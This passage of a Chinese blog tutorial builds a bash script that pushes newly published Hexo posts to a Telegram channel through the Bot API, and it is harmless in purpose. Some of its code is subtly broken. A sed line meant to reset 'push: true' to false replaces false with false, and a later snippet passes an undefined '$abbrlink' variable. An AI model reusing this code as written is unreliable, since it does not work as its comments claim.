class="line">————update————</span><br><span class="line">标题：xxx</span><br><span class="line">链接：xxx</span><br><span class="line">————————————</span><br><span class="line">标题：xxx</span><br><span class="line">链接：xxx</span><br><span class="line">————————————</span><br></pre></td></tr></table></figure><p>首先先完成 <code>update</code> 以上的部分，继续编写shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;) #获取当前时间</span><br><span class="line">commitMsg=&quot;</span><br><span class="line">————————————————</span><br><span class="line">main: https://www.gubaiovo.com</span><br><span class="line">blog: https://blog.gubaiovo.com</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">Time: $&#123;currentTime&#125;</span><br><span class="line"></span><br><span class="line">——————UPDATE——————</span><br><span class="line">&quot;</span><br></pre></td></tr></table></figure><p>这里要注意，换行不要直接写 <code>\n</code> 进行换行，会被各种神秘转义无法变成换行符。但是像上面在shell中编写时直接换行是可以的，而且最终呈现的效果也是换行。</p><p>这里可以先发送一次进行测试了。运行下方shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxxxxx</span><br><span class="line">ChatID=xxxxxx</span><br><span class="line"></span><br><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;) #获取当前时间</span><br><span class="line">commitMsg=&quot;</span><br><span class="line">————————————————</span><br><span class="line">main: xxx</span><br><span class="line">blog: xxx</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">Time: $&#123;currentTime&#125;</span><br><span class="line"></span><br><span class="line">——————UPDATE——————</span><br><span class="line">&quot;</span><br><span class="line">curl -s -X POST https://api.telegram.org/bot$&#123;TG_BOT_TOKEN&#125;/sendMessage -d chat_id=$ChatID -d text=&quot;$commitMsg&quot;</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/testmessage.png" alt="image-20250219194830929"></p><p>如果运行后像这样正常输出了，那么就完成一半了</p><p>如果运行后后台很久没反应，那么看看是不是代理出问题了</p><p>下面继续编写一个循环，用来遍历所有文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">path=/home/gubai/www/blog/source/_posts # 换成你的文章路径</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个函数用来追加需要push的文章信息</span></span><br><span class="line">addUpdate() &#123;</span><br><span class="line">    local commitMsg=&quot;$1&quot;</span><br><span class="line">    local title=&quot;$2&quot;</span><br><span class="line">    local addrlink=&quot;$3&quot;</span><br><span class="line">    local link=&quot;https://blog.gubaiovo.com/posts/$addrlink.html&quot;</span><br><span class="line">    commitMsg+=$(\nprintf &quot;Title: %s\nURL: %s\n&quot; &quot;$title&quot; &quot;$link&quot;)</span><br><span class="line">    commitMsg+=$(printf &quot;\n ————————————————&quot;)</span><br><span class="line">    echo &quot;$commitMsg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for file in &quot;$path&quot;/*; do</span><br><span class="line">    # 获取文件的前20行，也就是包含Front matter的范围。这里20可以根据你的Front matter的行数进行设定</span><br><span class="line">    fileContent=$(head -n 20 &quot;$file&quot;)</span><br><span class="line">    # 获取push字段。如果你用了其他字段作为key，那么将 &#x27;push:&#x27; 改为你设定的字段</span><br><span class="line">    push=$(echo &quot;$fileContent&quot; | grep &#x27;push:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">    # true用来决定推送，如果你用了其他的value来决定推送，改成你设定的value</span><br><span class="line">    if [ &quot;$push&quot; == &quot;true&quot; ]; then</span><br><span class="line">        # 提取 title 和 abbrlink</span><br><span class="line">        title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        # 这里调用了上方addUpdate()函数，用来追加message</span><br><span class="line">        commitMsg=$(addUpdate &quot;$commitMsg&quot; &quot;$title&quot; &quot;$addrlink&quot;)</span><br><span class="line">        # 将推送后的文章的push字段设为false，防止重复push(如果用了其他的key和value，记得更改)</span><br><span class="line">        sed -i &#x27;s/push: false/push: false/&#x27; &quot;$file&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>现在shell脚本可以遍历所有文件，获得 <code>push</code> 字段，根据对应的value决定是否追加到message</p><p>目前为止的完整shell如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxxxxx</span><br><span class="line">ChatID=xxxxxx</span><br><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;) #获取当前时间</span><br><span class="line">path=/home/gubai/www/blog/source/_posts # 换成你的文章路径</span><br><span class="line"></span><br><span class="line">commitMsg=&quot;</span><br><span class="line">————————————————</span><br><span class="line">main: xxx</span><br><span class="line">blog: xxx</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">Time: $&#123;currentTime&#125;</span><br><span class="line"></span><br><span class="line">——————UPDATE——————</span><br><span class="line">&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这个函数用来追加需要push的文章信息</span></span><br><span class="line">addUpdate() &#123;</span><br><span class="line">    local commitMsg=&quot;$1&quot;</span><br><span class="line">    local title=&quot;$2&quot;</span><br><span class="line">    local addrlink=&quot;$3&quot;</span><br><span class="line">    local link=&quot;https://blog.gubaiovo.com/posts/$addrlink.html&quot;</span><br><span class="line">    commitMsg+=$(\nprintf &quot;Title: %s\nURL: %s\n&quot; &quot;$title&quot; &quot;$link&quot;)</span><br><span class="line">    commitMsg+=$(printf &quot;\n ————————————————&quot;)</span><br><span class="line">    echo &quot;$commitMsg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for file in &quot;$path&quot;/*; do</span><br><span class="line">    # 获取文件的前20行，也就是包含Front matter的范围。这里20可以根据你的Front matter的行数进行设定</span><br><span class="line">    fileContent=$(head -n 20 &quot;$file&quot;)</span><br><span class="line">    # 获取push字段。如果你用了其他字段作为key，那么将 &#x27;push:&#x27; 改为你设定的字段</span><br><span class="line">    push=$(echo &quot;$fileContent&quot; | grep &#x27;push:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">    # true用来决定推送，如果你用了其他的value来决定推送，改成你设定的value</span><br><span class="line">    if [ &quot;$push&quot; == &quot;true&quot; ]; then</span><br><span class="line">        # 提取 title 和 abbrlink</span><br><span class="line">        title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        # 这里调用了上方addUpdate()函数，用来追加message</span><br><span class="line">        commitMsg=$(addUpdate &quot;$commitMsg&quot; &quot;$title&quot; &quot;$addrlink&quot;)</span><br><span class="line">        # 将推送后的文章的push字段设为false，防止重复push(如果用了其他的key和value，记得更改)</span><br><span class="line">        sed -i &#x27;s/push: false/push: false/&#x27; &quot;$file&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">curl -s -X POST https://api.telegram.org/bot$&#123;TG_BOT_TOKEN&#125;/sendMessage -d chat_id=$ChatID -d text=&quot;$commitMsg&quot;</span><br></pre></td></tr></table></figure><p>虽然现在能实现获取需要push的文章并进行推送，但是，如果没有需要push的文章呢？</p><p>假设现在所有文章都没有push字段，或者push字段不是true，那么，最终的message是下面内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">————————————————</span><br><span class="line">main: xxx</span><br><span class="line">blog: xxx</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">Time: $&#123;currentTime&#125;</span><br><span class="line"></span><br><span class="line">——————UPDATE——————</span><br></pre></td></tr></table></figure><p>bot会将这个板子推到频道，这显然不是我们想要的，我们想要的是没有需要push的就不push了。因此可以加一个变量 <code>flag</code> 用来标记是否需要推送。<code>flag</code> 初始化为 <code>false</code> ，如果在上方循环遍历中 <code>if [ &quot;$push&quot; == &quot;true&quot; ]</code> 成立了，那么就让 <code>flag</code> 为 <code>true</code> 。在发送请求时先检测flag值，如果flag为true，那么就发送请求</p><p>按照这个思路完善脚本，在最开头添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=false</span><br></pre></td></tr></table></figure><p>在 <code>if [ &quot;$push&quot; == &quot;true&quot; ]</code> 判断中添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$push&quot; == &quot;true&quot; ]; then</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">设为<span class="literal">true</span>确定需要推送</span></span><br><span class="line">        flag=true</span><br><span class="line">        title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        commitMsg=$(addUpdate &quot;$commitMsg&quot; &quot;$title&quot; &quot;$addrlink&quot;)</span><br><span class="line">        sed -i &#x27;s/push: false/push: false/&#x27; &quot;$file&quot;</span><br><span class="line">    fi</span><br></pre></td></tr></table></figure><p>在发送请求前添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if [ &quot;$flag&quot; == false ]; then</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p>如果flag为false，那么直接退出，也就不发送请求了。</p><p>修改后的shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxxx</span><br><span class="line">ChatID=xxxx</span><br><span class="line">path=/home/gubai/www/blog/source/_posts</span><br><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">flag=false</span><br><span class="line"></span><br><span class="line">commitMsg=&quot;</span><br><span class="line">————————————————</span><br><span class="line">main: xxx</span><br><span class="line">blog: xxx</span><br><span class="line">————————————————</span><br><span class="line"></span><br><span class="line">Time: $&#123;currentTime&#125;</span><br><span class="line"></span><br><span class="line">——————UPDATE——————</span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">addUpdate() &#123;</span><br><span class="line">    local commitMsg=&quot;$1&quot;</span><br><span class="line">    local title=&quot;$2&quot;</span><br><span class="line">    local addrlink=&quot;$3&quot;</span><br><span class="line">    local link=&quot;https://blog.gubaiovo.com/posts/$addrlink.html&quot;</span><br><span class="line">    commitMsg+=$(\nprintf &quot;Title: %s\nURL: %s\n&quot; &quot;$title&quot; &quot;$link&quot;)</span><br><span class="line">    commitMsg+=$(printf &quot;\n ————————————————&quot;)</span><br><span class="line">    echo &quot;$commitMsg&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for file in &quot;$path&quot;/*; do</span><br><span class="line">    fileContent=$(head -n 20 &quot;$file&quot;)</span><br><span class="line">    push=$(echo &quot;$fileContent&quot; | grep &#x27;push:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">    if [ &quot;$push&quot; == &quot;true&quot; ]; then</span><br><span class="line">        flag=true</span><br><span class="line">        title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        commitMsg=$(addUpdate &quot;$commitMsg&quot; &quot;$title&quot; &quot;$addrlink&quot;)</span><br><span class="line">        sed -i &#x27;s/push: false/push: false/&#x27; &quot;$file&quot;</span><br><span class="line">    fi</span><br><span class="line">done</span><br><span class="line"></span><br><span class="line">if [ &quot;$flag&quot; == false ]; then</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line">curl -s -X POST https://api.telegram.org/bot$&#123;TG_BOT_TOKEN&#125;/sendMessage -d chat_id=$ChatID -d text=&quot;$commitMsg&quot;</span><br></pre></td></tr></table></figure><p>现在基本可以使用了。但是在使用过程中，会发现一个问题：title中特殊符号截断字符串</p><p>这是我在推送我的Ollama API调用时发现的，效果如下</p><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/test.png" alt="image-20250219202050032"></p><p>可以看到，lua文章是正常的，但是ollama的文章因为 <code>&amp;</code> 被截断了。我们需要对title进行编码</p><p>添加编码函数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">URL 编码函数</span></span><br><span class="line">urlencode() &#123;</span><br><span class="line">    local length=&quot;$&#123;#1&#125;&quot;</span><br><span class="line">    local i=0</span><br><span class="line">    local c</span><br><span class="line">    local encoded=&quot;&quot;</span><br><span class="line">    while [ $i -lt $length ]; do</span><br><span class="line">        c=&quot;$&#123;1:$i:1&#125;&quot;</span><br><span class="line">        # 使用 iconv 检查字符是否为ascii，避免非ascii码文字(如中文)错误编码</span><br><span class="line">        if echo &quot;$c&quot; | iconv -f UTF-8 -t ISO-8859-1 &gt;/dev/null 2&gt;&amp;1; then</span><br><span class="line">            case $c in</span><br><span class="line">                [a-zA-Z0-9.~_-]) encoded+=&quot;$c&quot; ;;</span><br><span class="line">                *) encoded+=$(printf &#x27;%%%02X&#x27; &quot;&#x27;$c&quot;) ;;</span><br><span class="line">            esac</span><br><span class="line">        else</span><br><span class="line">            encoded+=&quot;$c&quot;</span><br><span class="line">        fi</span><br><span class="line">        ((i++))</span><br><span class="line">    done</span><br><span class="line">    echo &quot;$encoded&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用函数，编码title</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">        title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">        encodedTitle=$(urlencode &quot;$title&quot;)</span><br><span class="line">        commitMsg=$(addUpdate &quot;$commitMsg&quot; &quot;$encodedTitle&quot; &quot;$abbrlink&quot;)     </span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><img src="/assets/post_img/dev/Hexo_TG_bot_%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E6%8E%A8%E9%80%81%E6%96%87%E7%AB%A0%E5%88%B0telegram%E9%A2%91%E9%81%93/final.png" alt="image-20250219202843748"></p><p>这样便正确实现了推送功能</p><h2 id="自动调用推送">自动调用推送</h2><p>现在确实实现了推送，但是怎么才能在 <code>hexo d</code> 时自动调用呢</p><p>两种思路，一种为在shell <code>cd xxx</code>进入blog根目录，调用<code>hexo d</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">这两行位置没有影响</span></span><br><span class="line">cd /home/gubai/www/blog</span><br><span class="line">hexo d</span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxx</span><br><span class="line">ChatID=xxxx</span><br><span class="line">path=/home/gubai/www/blog/source/_posts</span><br><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line">flag=false</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>还有一种思路，使用hexo插件 <code>hexo-deployer-shell</code> ，这个插件为deploy添加新的类型 <code>shell</code> ，能够执行shell命令</p><p>github: <a href="https://github.com/HakurouKen/hexo-deployer-shell">https://github.com/HakurouKen/hexo-deployer-shell</a></p><figure class="highlight plaintext"><figcaption><span>i</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-shell --save</span><br></pre></td></tr></table></figure><p>安装后进入 hexo 的 <code>_config.yml</code>，找到 <code>deploy</code>项，像这样填写</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">deploy:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">git</span></span><br><span class="line">    <span class="attr">repository:</span> <span class="string">xxx</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">xxx</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">shell</span></span><br><span class="line">    <span class="attr">command:</span> <span class="string">~/www/blog/TG_push.sh</span></span><br></pre></td></tr></table></figure><p>hexo在执行 <code>hexo d</code> 时，会按照 <code>deploy</code> 的顺序依次执行 git 和 shell，参考<a href="https://hexo.io/zh-cn/docs/one-command-deployment">hexo文档</a></p><h2 id="ALL-CODE">ALL CODE</h2><p>第一种方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">TG_BOT_TOKEN=xxxxx</span><br><span class="line">ChatID=xxxxx</span><br><span class="line">path=xxxx</span><br><span class="line">currentTime=$(date +&quot;%Y-%m-%d %H:%M:%S&quot;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取文件夹中最新的文件名</span></span><br><span class="line">latestFile=$(ls -t $path | head -n 1)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取最新文件的修改时间</span></span><br><span class="line">latestFileTime=$(stat -c %Y &quot;$path/$latestFile&quot;)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取当前时间的时间戳</span></span><br><span class="line">currentTimeStamp=$(date +%s)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">计算时间差（秒）</span></span><br><span class="line">timeDiff=$((currentTimeStamp - latestFileTime))</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果时间差超过1800秒（30分钟），则不进行推送</span></span><br><span class="line">if [ $timeDiff -gt 1800 ]; then</span><br><span class="line">    exit 0</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">获取文件的前20行</span></span><br><span class="line">fileContent=$(head -n 20 &quot;$path/$latestFile&quot;)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">URL 编码函数</span></span><br><span class="line">urlencode() &#123;</span><br><span class="line">    local length=&quot;$&#123;#1&#125;&quot;</span><br><span class="line">    local i=0</span><br><span class="line">    local c</span><br><span class="line">    local encoded=&quot;&quot;</span><br><span class="line">    while [ $i -lt $length ]; do</span><br><span class="line">        c=&quot;$&#123;1:$i:1&#125;&quot;</span><br><span class="line">        # 使用 iconv 检查字符是否为中文</span><br><span class="line">        if echo &quot;$c&quot; | iconv -f UTF-8 -t ISO-8859-1 &gt;/dev/null 2&gt;&amp;1; then</span><br><span class="line">            case $c in</span><br><span class="line">                [a-zA-Z0-9.~_-]) encoded+=&quot;$c&quot; ;;</span><br><span class="line">                *) encoded+=$(printf &#x27;%%%02X&#x27; &quot;&#x27;$c&quot;) ;;</span><br><span class="line">            esac</span><br><span class="line">        else</span><br><span class="line">            encoded+=&quot;$c&quot;</span><br><span class="line">        fi</span><br><span class="line">        ((i++))</span><br><span class="line">    done</span><br><span class="line">    echo &quot;$encoded&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">提取 title 和 abbrlink</span></span><br><span class="line">title=$(echo &quot;$fileContent&quot; | grep &#x27;title:&#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">addrlink=$(echo &quot;$fileContent&quot; | grep &#x27;abbrlink: &#x27; | awk -F&#x27;: &#x27; &#x27;&#123;print $2&#125;&#x27;)</span><br><span class="line">encodedTitle=$(urlencode &quot;$title&quot;)</span><br><span class="line"></span><br><span class="line">commitMsg=&quot;</span><br><span class="line">推送时间：$currentTime</span><br><span class="line"></span><br><span class="line">更新：$encodedTitle</span><br><span class="line"></span><br><span class="line">文章链接：https://blog.gubaiovo.com/posts/$addrlink.html</span><br><span class="line">&quot;</span><br><span class="line">curl -s -X POST https://api.telegram.org/bot$&#123;TG_BOT_TOKEN&#125;/sendMessage -d chat_id=$ChatID -d text=&quot;$commitMsg&quot;</span><br></pre></td></tr></table></figure><p>第二种方式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span 